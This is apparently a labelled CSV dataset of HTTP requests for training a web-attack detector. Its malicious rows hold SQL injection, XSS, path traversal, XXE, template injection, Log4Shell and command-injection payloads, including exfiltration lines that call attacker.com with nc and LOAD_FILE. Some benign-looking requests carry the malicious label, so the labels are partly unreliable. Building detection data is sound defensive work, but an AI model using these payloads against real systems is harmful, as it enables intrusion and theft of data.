method,path,query,headers,body,ua,label
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: example.com
Accept: */*",,,1
GET,------------------------------------------,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: www.mysite.com
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
POST,/,,,"{""$gt"": """"}",,1
GET,/static/js/date-onerror-xmkQ1B6e.woff2,,,HTTP/1.1,,0
GET,<script>aaa</script>,,,,,1
GET,/assets/icon-drop-6QS4HA96.svg,,,HTTP/1.1,,0
GET,mercuryboard_user_agent_sql_injection.nasl' community-user-,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,../../../../etc/passwd,,,,,1
GET,/media/update.jpg,,,HTTP/1.1,,0
GET,id=1' OR '1'='1,,,,,1
GET,/static/css/button-union-dbpFPnmG.woff2,,,HTTP/1.1,,0
GET,/static/js/type-drop-pwJGD6ej.css,,,HTTP/1.1,,0
GET,/,?b87e1eadb1=sometext%3Csvg%20onload=alert%28document.domain%29%3E%3FmimeType=text%2Fhtml,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/static/js/drop-menu-vVaXXCxO.svg,,,HTTP/1.1,,0
GET,/static/js/insert-date-zAwnGscV.svg,,,HTTP/1.1,,0
GET,/,?selectPromotionId=986205&sku=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,,,,1
POST,/,,,"{""$gt"": """"}",,1
GET,/build/dialog-update-4waggrmv.css,,,HTTP/1.1,,0
GET,/,userPassword:2.5.13.18:=123,,,,1
GET,/media/whoami.woff2,,,HTTP/1.1,,0
GET,/assets/alert-image-2vlb1CB3.js,,,HTTP/1.1,,0
GET,../../../../etc/passwd,,,,,1
GET,/static/js/handler-where-k8T5L7kL.woff2,,,HTTP/1.1,,0
GET,"""><svg onmouseover=""confirm&#0000000040document.domain)",,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
POST,/,,,"{""$gt"": """"}",,1
GET,/static/js/date-whoami-3zyz5kSo.woff2,,,HTTP/1.1,,0
GET,"id=1' AND 1=CONVERT(int, (SELECT password FROM users LIMIT 0,1))--",,,,,1
GET,/assets/script-dialog-Jib11Hz2.png,,,HTTP/1.1,,0
GET,/static/css/widget-update-W46kAxsc.woff2,,,HTTP/1.1,,0
GET,/assets/whoami-tag-QBto3zpT.jpg,,,HTTP/1.1,,0
GET,/,"""));if(!self.x)self.x=!alert(document.domain)}catch(e){}//",,,,1
GET,/,dc1e09adea=%3Cimg%20src=x%20onerror=alert%28document.domain%29%3E%2Fall,,,,1
GET,/media/tag-eval-XN5mXHLe.svg,,,HTTP/1.1,,0
GET,/build/from-tag-70foBIJK.css,,,HTTP/1.1,,0
GET,/build/where-menu-MMYYu0Tc.jpg,,,HTTP/1.1,,0
GET,/,,,,,0
GET,$(whoami),,,,,1
GET,/assets/delete-menu-pv9PQ9fc.png,,,HTTP/1.1,,0
GET,/media/button-whoami-DvvAH08s.png,,,HTTP/1.1,,0
POST,/,,,"{""$gt"": """"}",,1
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: www.mysite.com
Accept: */*",,,1
GET,../../../../etc/passwd,,,,,1
GET,"id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: app.local
Accept: */*",,,1
GET,cat /etc/passwd,,,,,1
GET,${jndi:ldap://attacker.com/a},,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,"id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
POST,/,,,"{""$type"": ""System.Windows.Data.ObjectDataProvider, ...""}",,1
GET,/,,,,,0
GET,/build/script-button-OGcEkFcn.css,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: app.local
Accept: */*",,,1
GET,/media/alert.png,,,HTTP/1.1,,0
GET,/assets/where.min.css,,,HTTP/1.1,,0
GET,/static/css/whoami.png,,,HTTP/1.1,,0
GET,/build/cat-date-gCYrklyO.woff2,,,HTTP/1.1,,0
GET,/static/js/delete-clause-rwo5a3ad.png,,,HTTP/1.1,,0
POST,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",{{7*7}} or {{config.items()}},,1
GET,query { a: user(id:1) { name } b: user(id:2) { name } },,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,%0d%0aBcc: victim@example.com,,,,,1
GET,..\..\..\..\windows\system32\config\sam,,,,,1
GET,/,<svg%0Aonauxclick=0;[1].some(confirm)//,,,,1
GET,/,/&lt;svg/onload&equals;alert(1)&gt;,,,,1
GET,/,,,,,0
GET,/static/css/cat-icon-Lc5skESs.css,,,HTTP/1.1,,0
GET,/,"""onClick=""(prompt)(1)",,,,1
GET,/media/update-handler-JTI68QSA.woff2,,,HTTP/1.1,,0
GET,cmd=127.0.0.1 && ls /etc,,,,,1
GET,/static/js/row-onerror-jSNbO2Bg.woff2,,,HTTP/1.1,,0
GET,/,%3Cx/Onpointerrawupdate=confirm%26lpar;)%3Exxxxx,,,,1
GET,/static/js/insert.css,,,HTTP/1.1,,0
GET,/media/onerror.css,,,HTTP/1.1,,0
GET,/static/js/cat-type-XXl6rWn1.svg,,,HTTP/1.1,,0
GET,gopher://localhost:6379/_SET%20foo%20bar,,,,,1
GET,/assets/insert.jpg,,,HTTP/1.1,,0
GET,"http://lmb1ikpej3yys0gqft8lxewm2d89w5qtgh840sp.burpcollaborator.net/ 6.17.0.RELEASE iPhone12,8 iOS/14.5.1)) community-user-",,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,"<?xml version=""1.0"" encoding=""UTF-7""?> +ADwAIQ-DOCTYPE foo+AFs +ADwA IQ-ELEMENT foo ANY +AD4 +ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack- r.be:1337+ACI +AD4AXQA+ +ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4",,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: www.mysite.com
Accept: */*",,,1
GET,/,"#set($str=$class.inspect(""java.lang.Runtime"").type.getRuntime().exec(""id""))",,,,1
GET,<img src=x onerror=alert(document.domain)>/all,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/media/insert-handler-fARwJWef.css,,,HTTP/1.1,,0
GET,"<iframe src=""java sc ript:al ert()""></iframe>",,,,,1
GET,/static/css/eval.svg,,,HTTP/1.1,,0
GET,/static/js/union.svg,,,HTTP/1.1,,0
GET,/build/type-drop-YmC50f3n.jpg,,,HTTP/1.1,,0
GET,/static/css/icon-eval-74SveXEg.woff2,,,HTTP/1.1,,0
GET,../../../../etc/passwd%00,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: app.local
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: example.com
Accept: */*",,,1
GET,"-1945+/*!%55NiOn*/%20/*!%53eLEct*/+1,2,3,%27soy%20vulnerable%27,5,6, 7,8,9,10,11,12,13,14,15,16,17,18,19+--+",,,,,1
GET,/build/zone-select-JZhcpvSJ.js,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/assets/where.svg,,,HTTP/1.1,,0
GET,/assets/whoami.min.js,,,HTTP/1.1,,0
GET,"""><video><source onerror=eval(atob(http://some_host)) id=dmFyIGE9ZG9 jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYXlkaW5 ueXVudXMueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#6 1;>",,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: www.mysite.com
Accept: */*",,,1
GET,/build/handler-where-aglSZBxb.jpg,,,HTTP/1.1,,0
GET,/,,,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,0
GET,/,,,,,0
GET,/assets/delete.jpg,,,HTTP/1.1,,0
GET,/media/insert-menu-hRmpIsmJ.js,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,id=1' OR '1'='1,,,,,1
GET,/static/css/alert.min.js,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/static/css/script.woff2,,,HTTP/1.1,,0
GET,/static/js/tag-alert-sfw8A2dn.png,,,HTTP/1.1,,0
GET,V100 CAPABILITY V101 FETCH 4791,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/static/css/whoami.min.js,,,HTTP/1.1,,0
GET,; echo $USER | nc attacker.com 1234,,,,,1
GET,/,'>alert(1)</script><script/1=',,,,1
GET,id=1'; WAITFOR DELAY '0:0:5'--,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/static/js/from.js,,,HTTP/1.1,,0
GET,"<?xml version=""1.0"" encoding=""utf-8"" standalone=""no"" ?><x xmlns:xsi =""http://www.w3.org/2001/XMLSchema-instance"" xsi:schemaLocation=""htt p://xxe-xsi-schemalocation.yourdomain[.]com/""/>",,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,"<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""http://host/ text.txt"" > ] > <foo>&xxe;</foo>",,,,,1
POST,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: www.mysite.com
Accept: */*",{{1337*1338}},,1
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,QUIT,,,,,1
GET,/static/js/menu-delete-o51nM3GS.png,,,HTTP/1.1,,0
GET,union select,,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/assets/tag-alert-80NKwCRM.woff2,,,HTTP/1.1,,0
GET,/,*(|(objectclass=*)),,,,1
GET,/static/js/where-zone-wrXyXWQs.svg,,,HTTP/1.1,,0
GET,/static/js/select-function-MpExH6Dq.js,,,HTTP/1.1,,0
GET,/build/select-button-48fBxXc8.png,,,HTTP/1.1,,0
GET,/assets/icon-from-5Okrhx4d.woff2,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: www.mysite.com
Accept: */*",,,1
POST,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*","{""id"": {""$bitsAllSet"": [1, 5]}}",,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/,id=1&id=2,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: api.internal
Accept: */*",,,1
GET,/build/whoami.woff2,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/,,,,,0
GET,"<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""expect://i d"">]><foo>&xxe;</foo>",,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/assets/update.jpg,,,HTTP/1.1,,0
GET,/,?de3c392736=&lt%3Bsvg%2Fonload&equals%3Balert%281%29&gt%3B,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/build/widget-where-kXCJfk1c.css,,,HTTP/1.1,,0
GET,"<a href=""http://malicious.com"" target=""_blank"">Click here</a>",,,,,1
GET,/static/js/alert-clause-B7Ds2Vi5.png,,,HTTP/1.1,,0
GET,/,,,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
POST,/,,,{smart_f_shell_exec('id')},,1
GET,/,,,,,0
POST,/,,,"{""__proto__"": {""isAdmin"": true}}",,1
GET,/static/js/insert-form-bcKZ9vBK.css,,,HTTP/1.1,,0
GET,/build/eval-handler-G5jGP0R6.png,,,HTTP/1.1,,0
GET,/,?daf76f95d5=Tarun~%3C%22%3E%3Cdetails%2Fopen%2Fontoggle=%22jAvAsCrIpT&colon%3Balert&lpar%3B%2Fxss-by-tarun%2F&rpar%3B%22%3EXXXXX%3C%2Fa%3E,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: example.com
Accept: */*",,,1
GET,gopher://localhost:6379/_SET%20foo%20bar,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/assets/date-onerror-iQRylFaD.woff2,,,HTTP/1.1,,0
GET,/build/cat-clause-YIBz8pmQ.svg,,,HTTP/1.1,,0
GET,/static/css/whoami.js,,,HTTP/1.1,,0
GET,<script>alert('XSS')</script>,,,,,1
GET,cat /etc/passwd,,,,,1
GET,/build/where-clause-Mymc52cn.css,,,HTTP/1.1,,0
GET,/static/js/script-menu-1STnHsI4.woff2,,,HTTP/1.1,,0
GET,gzip compressed content with chosen prefix,,,,,1
GET,/media/type-select-kJ9bA57A.png,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/static/js/eval.js,,,HTTP/1.1,,0
GET,/js/components/WhereClause.js,,,HTTP/1.1,,0
GET,id=1' OR '1'='1,,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/static/js/insert-dialog-lCqCK4Pm.png,,,HTTP/1.1,,0
GET,/media/select.css,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/static/css/select.css,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: example.com
Accept: */*",,,1
GET,"id=1 AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 0,1), '.attacker.com\\a')))",,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: www.mysite.com
Accept: */*",,,1
GET,/assets/type-alert-tSfZhAlP.js,,,HTTP/1.1,,0
GET,/static/js/insert-type-jX7aL2gA.js,,,HTTP/1.1,,0
GET,"http://lmb1ikpej3yys0gqft8lxewm2d89w5qtgh840sp.burpcollaborator.net/ 6.17.0.RELEASE iPhone12,8 iOS/14.5.1)) community-user-",,,,,1
GET,/,|getent+hosts+somehost.burpcollaborator.net.&,,,,1
GET,/static/css/onerror-icon-HY57rr5F.css,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: api.internal
Accept: */*",,,1
GET,/assets/zone-alert-2mLMtxyz.css,,,HTTP/1.1,,0
GET,/media/script-row-NYaes73m.png,,,HTTP/1.1,,0
GET,/static/js/update-row-CdYOcfDe.jpg,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/assets/delete.png,,,HTTP/1.1,,0
POST,/,,,"{""$gt"": """"}",,1
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/,,,,,0
GET,/media/date-onerror-iv4FKPZP.png,,,HTTP/1.1,,0
GET,/assets/onerror-type-2krrTj7j.svg,,,HTTP/1.1,,0
GET,/static/css/function-union-6ygfg6di.svg,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/assets/from.png,,,HTTP/1.1,,0
GET,User-Agent: ' OR SLEEP(5) OR ',,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/static/css/function-from-6sBk13z0.woff2,,,HTTP/1.1,,0
GET,/assets/whoami-icon-YHdeMC57.css,,,HTTP/1.1,,0
GET,/build/onerror.jpg,,,HTTP/1.1,,0
GET,/,,,,,0
GET,/assets/clause-whoami-U4rEgAqZ.svg,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: www.mysite.com
Accept: */*",,,1
GET,/assets/whoami.svg,,,HTTP/1.1,,0
GET,/,|getent+hosts+somehost.burpcollaborator.net.&,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,0;var date=new Date(); do{curDate = new Date();}while(curDate-date<1 0000),,,,,1
GET,<script>alert('XSS')</script>,,,,,1
GET,id=1' OR '1'='1,,,,,1
GET,"<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""http://host/ text.txt"" > ] > <foo>&xxe;</foo>",,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: example.com
Accept: */*",,,1
GET,/build/delete-icon-oFWqVTGg.css,,,HTTP/1.1,,0
GET,alert?.(document?.cookie),,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/build/form-insert-DDsadXw7.css,,,HTTP/1.1,,0
GET,"data:text/html,<form action=https://127.0.0.1/xss-cp.php method=post ><input type=hidden name=a value=""<img/src=//127.0.0.1/yt.jpg onpoin terenter=alert`1`>""><input type=submit></form>",,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/build/menu-update-VzwPSiBY.woff2,,,HTTP/1.1,,0
GET,<!<script>alert(document.domain)</script>,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/assets/menu-onerror-IBUhZLPf.js,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
POST,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",{{7*7}} or {{config.items()}},,1
GET,/assets/cat.jpg,,,HTTP/1.1,,0
GET,id=1' OR '1'='1,,,,,1
GET,/,"""//Onx=""""//onfocus=prompt(1)>","User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,cmd=127.0.0.1 && ls /etc,,,,,1
GET,/assets/onerror.min.css,,,HTTP/1.1,,0
GET,/assets/drop.js,,,HTTP/1.1,,0
GET,/assets/script-form-sL2VJWIJ.jpg,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: api.internal
Accept: */*",,,1
GET,/build/delete.svg,,,HTTP/1.1,,0
GET,/static/js/drop.min.css,,,HTTP/1.1,,0
